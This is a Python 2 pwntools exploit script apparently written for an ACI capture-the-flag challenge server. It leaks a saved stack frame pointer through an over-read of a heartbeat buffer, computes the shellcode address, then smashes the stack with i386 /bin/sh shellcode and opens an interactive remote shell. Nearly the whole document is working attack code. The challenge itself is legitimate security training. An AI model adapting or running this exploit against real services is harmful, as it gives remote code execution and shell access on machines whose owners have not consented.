#!/usr/bin/env python2

"""
python2 -c "from pwn import *; print 'HELLO\x00' + cyclic(500) + '\x00'" | ./server
[1374658.606197] server[98418]: segfault at 61616764 ip 0000000061616764 sp 00000000ff9be390 error
14
$ cyclic -l 0x61616764
323
"""

from pwn import *

conn = remote("challenge.acictf.com", 31813)
#conn = process("./server")
#gdb.attach(conn, "b *0x08048559\n c")

elf = ELF("./server")

#context.log_level = "debug"

RET_OFFSET = 316            # offset from heartbeat buffer to saved ret
EBP_OFFSET = 312            # offset from heartbeat buffer to saved EBP
SHELLCODE_OFFSET = -328     # offset from previous EBP to start of shellcode

def main():
    # Leak the previous stack frame's EBP
    payload = "HELLO\x00aaa" + p32(EBP_OFFSET+4) + "c"*32 + "\x00"
    conn.send(payload)
    conn.recv(EBP_OFFSET)
    ebp = u32(conn.recv(4))
    shellcode_addr = ebp + SHELLCODE_OFFSET
    log.info("Previous EBP: 0x{:x}".format(ebp))
    log.info("Shellcode   : 0x{:x}".format(shellcode_addr))

    # Smash the stack and return to shellcode
    shellcode = asm(shellcraft.i386.linux.sh())
    shellcode = shellcode + "c" * (RET_OFFSET - len(shellcode))
    payload = "HELLO\x00aaa" + p32(0) + shellcode + p32(shellcode_addr) + "\x00"

    conn.send(payload)
    conn.interactive()

if __name__ == "__main__":
    main()
